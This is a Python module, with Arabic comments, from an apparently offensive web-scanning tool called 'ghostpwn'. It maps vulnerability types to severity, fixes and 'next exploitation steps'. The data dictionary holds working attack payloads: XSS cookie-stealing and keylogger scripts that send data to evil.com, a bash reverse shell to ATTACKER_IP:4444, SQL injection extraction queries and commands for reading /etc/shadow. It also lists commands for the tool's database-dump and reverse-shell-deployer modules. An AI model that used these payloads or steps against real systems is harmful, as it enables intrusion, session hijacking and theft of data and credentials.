#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Smart Vulnerability Notifier
إشعارات ذكية وتفصيلية للثغرات المكتشفة

الذكاء:
1. لكل ثغرة توجد، يعرض:
   - نوعها ودرجة خطورتها
   - كيف تم اكتشافها (الـ path)
   - الـ payload اللي نجح
   - الأثر المتوقع
   - التوصية بالإصلاح
   - درجة الثقة (confidence)
2. إشعارات مرئية بالألوان
3. تلخيص في النهاية
"""
import sys
import os
import json
from typing import Dict, List, Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.arabic_display import SmartLogger, Colors, fix_display


# ============================ Vulnerability Details Database ============================
VULN_DETAILS = {
    "sql_injection_error": {
        "name_ar": "حقن SQL (Error-based)",
        "name_en": "SQL Injection (Error-based)",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر يقرأ/يعدّل/يحذف كل البيانات في قاعدة البيانات. ممكن يوصل لـ RCE عبر INTO OUTFILE.",
        "impact_en": "Attacker can read/modify/delete all database data. Possible RCE via INTO OUTFILE.",
        "fix_ar": "استخدم Prepared Statements (Parameterized Queries). لا تثق بمدخلات المستخدم. استخدم ORM. فعّل أقل صلاحيات لحساب DB.",
        "fix_en": "Use Prepared Statements. Don't trust user input. Use ORM. Apply least privileges to DB user.",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-89",
        "next_steps_ar": [
            "استخرج قائمة قواعد البيانات: ' UNION SELECT schema_name FROM information_schema.schemata--",
            "استخرج الجداول: ' UNION SELECT table_name FROM information_schema.tables--",
            "ابحث عن جدول users واكتبه",
            "افحص لو فيه صلاحية DBA لـ RCE",
        ],
        "exploit_commands": [
            "python3 ghostpwn.py --auto --dump-db URL",
            "python3 -m modules.db_dump --url URL --param id",
        ],
    },
    "sql_injection_boolean": {
        "name_ar": "حقن SQL (Boolean-based)",
        "name_en": "SQL Injection (Boolean-based blind)",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "نفس Error-based لكن أصعب في الاستغلال. المهاجم يستخرج البيانات حرف بحرف.",
        "fix_ar": "استخدم Prepared Statements. راجع كل الاستعلامات الديناميكية.",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-89",
    },
    "sql_injection_time": {
        "name_ar": "حقن SQL (Time-based blind)",
        "name_en": "SQL Injection (Time-based blind)",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يستخرج البيانات عبر تأخير الـ response. أصعب لكن فعال.",
        "fix_ar": "استخدم Prepared Statements. فعّl timeout على الـ queries.",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-89",
    },
    "xss_reflected": {
        "name_ar": "XSS (Reflected)",
        "name_en": "Cross-Site Scripting (Reflected)",
        "severity": "high",
        "cvss": 6.1,
        "impact_ar": "المهاجم يقدر يسرق cookies، session tokens، أو ينفّذ أكواد JS في متصفح الضحية.",
        "fix_ar": "استخدم Context-Aware Output Encoding. فعّل CSP. استخدم HttpOnly cookies.",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-79",
        "next_steps_ar": [
            "جرّب سرقة cookie: <script>document.location='http://evil.com/?c='+document.cookie</script>",
            "افحص لو الـ cookie فيه HttpOnly flag",
            "جرّب keylogger: <script>document.onkeypress=function(e){fetch('http://evil.com/?k='+e.key)}</script>",
        ],
    },
    "lfi": {
        "name_ar": "تضمين ملف محلي (LFI)",
        "name_en": "Local File Inclusion",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر يقرأ أي ملف على السيرفر: /etc/passwd، /etc/shadow، config files، logs.",
        "fix_ar": "لا تمرر مدخلات المستخدم لدوال include. استخدم whitelist للملفات المسموح بها.",
        "owasp": "A01:2021 - Broken Access Control",
        "cwe": "CWE-22",
        "next_steps_ar": [
            "اقرأ /etc/passwd لتأكيد الثغرة",
            "جرّب php://filter لقراءة source code",
            "جرّب log poisoning لـ RCE",
            "ابحث عن ملفات config الحساسة",
        ],
        "exploit_commands": [
            "python3 -m modules.exploit --type lfi-read --target URL --param file --file /etc/passwd",
        ],
    },
    "command_injection": {
        "name_ar": "حقن الأوامر (RCE)",
        "name_en": "Command Injection / RCE",
        "severity": "critical",
        "cvss": 10.0,
        "impact_ar": "أخطر ثغرة! المهاجم ينفّذ أوامر على السيرفر. ممكن يحصل على shell كامل، يرفع صلاحياته، ويتحكم في السيرفر.",
        "fix_ar": "لا تستخدم system() مع مدخلات المستخدم. استخدم مكتبات native. استخدم escapeshellarg().",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-78",
        "next_steps_ar": [
            "نفّذ 'id' لتأكيد الثغرة",
            "احصل على reverse shell: ;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "استخرج /etc/passwd و /etc/shadow",
            "افحص صلاحيات sudo: sudo -l",
            "ابحث عن ملفات config للـ DBs",
        ],
        "exploit_commands": [
            "python3 ghostpwn.py --deploy-shell --listener-ip YOUR_IP --listener-port 4444",
            "python3 -m modules.revshell_deployer --url URL --param cmd --ip YOUR_IP --port 4444",
        ],
    },
    "ssti": {
        "name_ar": "حقن القوالب (SSTI)",
        "name_en": "Server-Side Template Injection",
        "severity": "critical",
        "cvss": 10.0,
        "impact_ar": "المهاجم ينفّذ كود Python/Java/PHP على السيرفر. غالباً يؤدي لـ RCE كامل.",
        "fix_ar": "لا تمرر مدخلات المستخدم لـ template engines. استخدم sandbox.",
        "owasp": "A03:2021 - Injection",
        "cwe": "CWE-1336",
        "next_steps_ar": [
            "حدد نوع الـ template engine (Jinja2/Twig/FreeMarker)",
            "استخرج config و SECRET_KEY",
            "احصل على RCE عبر os.popen()",
        ],
    },
    "open_redirect": {
        "name_ar": "إعادة توجيه مفتوحة",
        "name_en": "Open Redirect",
        "severity": "medium",
        "cvss": 4.3,
        "impact_ar": "المهاجم يقدر يوجّه المستخدمين لموقع خبيث. يُستخدم في phishing.",
        "fix_ar": "لا توجّه لـ URLs من مدخلات بدون تحقق. استخدم whitelist.",
        "owasp": "A01:2021 - Broken Access Control",
        "cwe": "CWE-601",
    },
    "cors_wildcard_credentials": {
        "name_ar": "CORS خاطئ (Wildcard + Credentials)",
        "name_en": "CORS Misconfiguration",
        "severity": "high",
        "cvss": 7.5,
        "impact_ar": "المهاجم يقدر يسرق بيانات المستخدمين من أي موقع. أخطر نوع CORS.",
        "fix_ar": "لا تستخدم ACAO: * مع credentials. حدد origins مسموح بها.",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-942",
    },
    "clickjacking": {
        "name_ar": "Clickjacking",
        "name_en": "Clickjacking",
        "severity": "medium",
        "cvss": 4.3,
        "impact_ar": "المهاجم يقدر يخدع المستخدمين للنقر على عناصر مخفية. يُستخدم لـ CSRF.",
        "fix_ar": "أضف X-Frame-Options: DENY أو CSP frame-ancestors.",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-1021",
    },
    "missing_security_header": {
        "name_ar": "Header أمني مفقود",
        "name_en": "Missing Security Header",
        "severity": "low",
        "cvss": 3.1,
        "impact_ar": "يزيد من سطح الهجوم. قد يسهّل ثغرات تانية.",
        "fix_ar": "أضف الـ headers المفقودة في إعدادات الـ server.",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-693",
    },
    "waf_detected": {
        "name_ar": "WAF مكتشف",
        "name_en": "WAF Detected",
        "severity": "info",
        "cvss": 0.0,
        "impact_ar": "الموقع محمي بـ WAF. قد يصعب الفحص.",
        "fix_ar": "لا حاجة للإصلاح - هذا إيجابي.",
        "owasp": "N/A",
        "cwe": "N/A",
    },
    "no_waf": {
        "name_ar": "بدون WAF",
        "name_en": "No WAF Protection",
        "severity": "medium",
        "cvss": 5.0,
        "impact_ar": "الموقع بدون حماية WAF. عرضة للهجمات.",
        "fix_ar": "ركّب WAF (Cloudflare, ModSecurity, AWS WAF).",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-693",
    },
    "xxe": {
        "name_ar": "XXE (XML External Entity)",
        "name_en": "XML External Entity",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر يقرأ ملفات، يعمل SSRF، أو RCE.",
        "fix_ar": "عطّل DTD processing في XML parser.",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-611",
    },
    "ssrf": {
        "name_ar": "SSRF",
        "name_en": "Server-Side Request Forgery",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر يصل للـ internal network، يقرأ metadata (AWS)، أو ينفّذ RCE.",
        "fix_ar": "تحقق من URLs من المستخدم. عطّل الوصول لـ metadata/localhost.",
        "owasp": "A10:2021 - SSRF",
        "cwe": "CWE-918",
    },
    "subdomain_takeover": {
        "name_ar": "اختطاف Subdomain",
        "name_en": "Subdomain Takeover",
        "severity": "high",
        "cvss": 8.1,
        "impact_ar": "المهاجم يقدر يتحكم في subdomain وينتحل شخصية الموقع.",
        "fix_ar": "احذف DNS records للـ subdomains غير المستخدمة.",
        "owasp": "A05:2021 - Security Misconfiguration",
        "cwe": "CWE-350",
    },
    "idor": {
        "name_ar": "IDOR",
        "name_en": "Insecure Direct Object Reference",
        "severity": "high",
        "cvss": 7.5,
        "impact_ar": "المهاجم يقدر يصل لبيانات مستخدمين آخرين عبر تغيير الـ ID.",
        "fix_ar": "استخدم authorization checks على كل الموارد.",
        "owasp": "A01:2021 - Broken Access Control",
        "cwe": "CWE-639",
    },
    "jwt_none_algorithm": {
        "name_ar": "JWT (none algorithm)",
        "name_en": "JWT with 'none' Algorithm",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر ينشئ tokens صالحة لأي مستخدم.",
        "fix_ar": "لا تقبل خوارزمية 'none'. حدد خوارزمية واحدة expected.",
        "owasp": "A02:2021 - Cryptographic Failures",
        "cwe": "CWE-327",
    },
    "exposed_backup": {
        "name_ar": "ملف Backup مكشوف",
        "name_en": "Exposed Backup File",
        "severity": "high",
        "cvss": 7.5,
        "impact_ar": "المهاجم يقدر يحمّل الـ backup ويحصل على source code + بيانات حساسة.",
        "fix_ar": "احذف الـ backups من webroot.",
        "owasp": "A01:2021 - Broken Access Control",
        "cwe": "CWE-538",
    },
    "git_exposed": {
        "name_ar": "مجلد .git مكشوف",
        "name_en": "Git Repository Exposed",
        "severity": "critical",
        "cvss": 9.8,
        "impact_ar": "المهاجم يقدر يحمّل كل source code + history + secrets.",
        "fix_ar": "احذف مجلد .git من webroot.",
        "owasp": "A01:2021 - Broken Access Control",
        "cwe": "CWE-540",
    },
    "weak_credentials": {
        "name_ar": "بيانات اعتماد ضعيفة",
        "name_en": "Weak Credentials",
        "severity": "high",
        "cvss": 7.5,
        "impact_ar": "المهاجم يقدر يدخل للنظام ببيانات ضعيفة.",
        "fix_ar": "استخدم سياسة كلمات مرور قوية. فعّل 2FA.",
        "owasp": "A07:2021 - Identification and Auth Failures",
        "cwe": "CWE-521",
    },
}


# ============================ Smart Notifier ============================
class SmartNotifier:
    """مُبلّغ ذكي للثغرات"""

    def __init__(self, audit_logger=None):
        self.audit = audit_logger
        self.logger = SmartLogger()
        self.vulns_reported = []
        self.total_vulns = 0
        self.by_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}

    def notify_vuln(self, vuln: Dict, confidence: float = 1.0):
        """إشعار تفصيلي بثغرة مكتشفة"""
        vuln_type = vuln.get("type", "unknown")
        details = VULN_DETAILS.get(vuln_type, {})

        severity = vuln.get("severity", "info")
        self.total_vulns += 1
        if severity in self.by_severity:
            self.by_severity[severity] += 1

        # تسجيل
        self.vulns_reported.append({**vuln, "confidence": confidence, "details": details})

        # عرض الإشعار
        self._print_vuln_notification(vuln, details, confidence)

        if self.audit:
            self.audit.log_event(f"VULN FOUND: {vuln_type} ({severity})", "vuln")

    def _print_vuln_notification(self, vuln: Dict, details: Dict, confidence: float):
        """عرض إشعار الثغرة بشكل جميل"""
        vuln_type = vuln.get("type", "unknown")
        severity = vuln.get("severity", "info")

        # ألوان حسب الخطورة
        sev_colors = {
            "critical": Colors.RED + Colors.BOLD,
            "high": Colors.RED,
            "medium": Colors.YELLOW,
            "low": Colors.BLUE,
            "info": Colors.GRAY,
        }
        sev_labels = {
            "critical": "حرج",
            "high": "عالي",
            "medium": "متوسط",
            "low": "منخفض",
            "info": "معلومة",
        }

        color = sev_colors.get(severity, Colors.NC)
        label = sev_labels.get(severity, severity)

        # Header
        print()
        print(f"{color}{'!'*60}{Colors.NC}")
        print(f"{color}  ⚠️  ثغرة مكتشفة: {fix_display(details.get('name_ar', vuln_type))}{Colors.NC}")
        print(f"{color}{'!'*60}{Colors.NC}")

        # تفاصيل أساسية
        print(f"\n  {Colors.BOLD}📋 التفاصيل:{Colors.NC}")
        print(f"    النوع: {fix_display(details.get('name_ar', vuln_type))}")
        print(f"    الخطورة: {color}{label}{Colors.NC} ({severity})")
        if details.get("cvss"):
            print(f"    CVSS: {details['cvss']}")
        if details.get("owasp"):
            print(f"    OWASP: {fix_display(details['owasp'])}")
        if details.get("cwe"):
            print(f"    CWE: {details['cwe']}")
        print(f"    درجة الثقة: {confidence*100:.0f}%")

        # الـ URL والـ payload
        if vuln.get("url"):
            print(f"\n  {Colors.BOLD}🎯 الهدف:{Colors.NC}")
            print(f"    URL: {vuln['url'][:100]}")
        if vuln.get("param"):
            print(f"    Parameter: {vuln['param']}")
        if vuln.get("payload"):
            print(f"    Payload: {vuln['payload'][:100]}")
        if vuln.get("evidence"):
            print(f"    الدليل: {fix_display(str(vuln['evidence'])[:150])}")

        # الأثر
        if details.get("impact_ar"):
            print(f"\n  {Colors.BOLD}💥 الأثر المتوقع:{Colors.NC}")
            print(f"    {fix_display(details['impact_ar'])}")

        # التوصية
        if details.get("fix_ar"):
            print(f"\n  {Colors.BOLD}✅ التوصية بالإصلاح:{Colors.NC}")
            print(f"    {fix_display(details['fix_ar'])}")

        # الخطوات التالية
        if details.get("next_steps_ar"):
            print(f"\n  {Colors.BOLD}🔍 الخطوات التالية للاستغلال:{Colors.NC}")
            for i, step in enumerate(details["next_steps_ar"], 1):
                print(f"    {i}. {fix_display(step)}")

        # أوامر الاستغلال
        if details.get("exploit_commands"):
            print(f"\n  {Colors.BOLD}💻 أوامر الاستغلال:{Colors.NC}")
            for cmd in details["exploit_commands"]:
                print(f"    {Colors.CYAN}{cmd}{Colors.NC}")

        print(f"\n{color}{'-'*60}{Colors.NC}")

    def print_summary(self):
        """عرض ملخص كل الثغرات"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  📊 ملخص الثغرات المكتشفة{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}إجمالي الثغرات: {self.total_vulns}{Colors.NC}\n")

        sev_labels = {
            "critical": "حرج",
            "high": "عالي",
            "medium": "متوسط",
            "low": "منخفض",
            "info": "معلومة",
        }
        sev_colors = {
            "critical": Colors.RED,
            "high": Colors.RED,
            "medium": Colors.YELLOW,
            "low": Colors.BLUE,
            "info": Colors.GRAY,
        }

        for sev in ["critical", "high", "medium", "low", "info"]:
            count = self.by_severity[sev]
            if count > 0:
                color = sev_colors[sev]
                label = sev_labels[sev]
                bar = "█" * count
                print(f"  {color}{label:8s}: {count} {bar}{Colors.NC}")

        # ترتيب الثغرات حسب الخطورة
        print(f"\n  {Colors.BOLD}الثغرات حسب الخطورة:{Colors.NC}")
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

        sorted_vulns = sorted(
            self.vulns_reported,
            key=lambda v: sev_order.get(v.get("severity", "info"), 5)
        )

        for i, v in enumerate(sorted_vulns[:15], 1):  # أول 15
            severity = v.get("severity", "info")
            color = sev_colors.get(severity, Colors.NC)
            vtype = v.get("type", "unknown")
            name = v.get("details", {}).get("name_ar", vtype)
            confidence = v.get("confidence", 1.0) * 100

            print(f"  {i:2d}. {color}[{severity:8s}]{Colors.NC} {fix_display(name)} ({confidence:.0f}%)")

        if len(self.vulns_reported) > 15:
            print(f"  ... و {len(self.vulns_reported) - 15} ثغرة أخرى")

        # حساب درجة الخطر
        risk_score = (
            self.by_severity["critical"] * 10 +
            self.by_severity["high"] * 7 +
            self.by_severity["medium"] * 4 +
            self.by_severity["low"] * 1
        )

        if risk_score >= 20:
            risk_level = "حرج 🔴"
            risk_color = Colors.RED + Colors.BOLD
        elif risk_score >= 10:
            risk_level = "عالي 🟠"
            risk_color = Colors.RED
        elif risk_score >= 5:
            risk_level = "متوسط 🟡"
            risk_color = Colors.YELLOW
        elif risk_score > 0:
            risk_level = "منخفض 🔵"
            risk_color = Colors.BLUE
        else:
            risk_level = "آمن 🟢"
            risk_color = Colors.GREEN

        print(f"\n  {Colors.BOLD}مستوى الخطر الإجمالي:{Colors.NC} {risk_color}{fix_display(risk_level)}{Colors.NC} (الدرجة: {risk_score})")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")

    def get_vulns_json(self) -> str:
        """الحصول على كل الثغرات في JSON"""
        return json.dumps(self.vulns_reported, ensure_ascii=False, indent=2)


# ============================ Test ============================
if __name__ == "__main__":
    notifier = SmartNotifier()

    # ثغرات تجريبية
    test_vulns = [
        {
            "type": "sql_injection_error",
            "severity": "critical",
            "url": "https://target.com/page?id=1",
            "param": "id",
            "payload": "' OR '1'='1",
            "evidence": "MySQL syntax error in response",
        },
        {
            "type": "xss_reflected",
            "severity": "high",
            "url": "https://target.com/search?q=test",
            "param": "q",
            "payload": "<script>alert(1)</script>",
            "evidence": "Payload reflected without encoding",
        },
        {
            "type": "clickjacking",
            "severity": "medium",
            "url": "https://target.com",
            "evidence": "Missing X-Frame-Options header",
        },
    ]

    for vuln in test_vulns:
        notifier.notify_vuln(vuln, confidence=0.95)

    notifier.print_summary()
